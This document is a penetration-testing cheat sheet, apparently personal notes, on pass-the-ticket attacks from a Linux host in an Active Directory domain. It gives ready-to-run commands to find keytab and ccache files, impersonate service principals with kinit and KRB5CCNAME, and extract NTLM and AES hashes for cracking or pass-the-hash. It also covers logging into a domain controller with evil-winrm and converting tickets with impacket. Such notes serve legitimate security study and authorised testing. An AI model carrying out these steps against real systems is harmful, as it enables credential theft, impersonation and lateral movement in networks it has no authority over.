-- -
PtT attack from a Linux host. Note that a Linux system does not need to be domain joined to use kerberos tickets. It can do so for scripts or network authentication. 
### Check if system is domain joined
Need the tool `realm`
```bash
# use builtin tools
ps -ef | grep -i "winbind\|sssd"

# use specialized tools
realm list
```
### Find Keytab Files
The extension is not required to be `.keytab`, but it usually is based on convention.
```bash
# must have r/w privs to use it
find / -name *keytab* -ls 2>/dev/null
```
### Find ccache file
```bash
ls /tmp 
env | grep -i krb5
```
### Abuse KeyTab File
#### Impersonate User
```bash
# lists out the Service Principal (user) the keytab file is associated with
klist -k -t <path to keytab file> 

# impersonate Service Principal (user)
# case sensitive, so make sure to copy+paste the exact spelling of the user
kinit <principal> -k -t <path to keytab file> 

# only applies to the current session and will not persist unless you save a copy of the ccache file.
```
#### Extract hashes from KeyTab file
```bash
# outputs domain, service principal (user), NTLM hash, AES 256 hash, and AES 128 hash
python3 keytabextract.py <file to keytab file> 
```
From here you can crack the hashes, or use them for pass-the-hash or pass-the-ticket attacks.
#### Importing ccache into current session
allows you to impersonate the Service Principal
```bash
export KRB5CCNAME=<path to ccache file> 
```
*Note: ccache files are temporary so pay attention to the "valid starting" and "expires" dates. If it is expired, this will not work.*
### Misc
#### Use kerberos login w/ evil-winrm
```bash
# you need the package krb5-user
# it will ask you for the domain name and DC hostname during installation
sudo apt-get install krb5-user -y

# if it's already installed, you can put the current domain and DC in the config file directly
sudo vim /etc/krb5.conf

# then funnel it into evil-winrm
evil-winrm -i <dc hostname> -r <domain> 
```
#### Convert ccache to kirbi and vice versa
```bash
# ccache -> kirbi
impacket-ticketConverter <ccache file> <output kirbi file> 

# kirbi -> ccache
impacket-ticketConverter <kirbi file> <output ccache file> 
```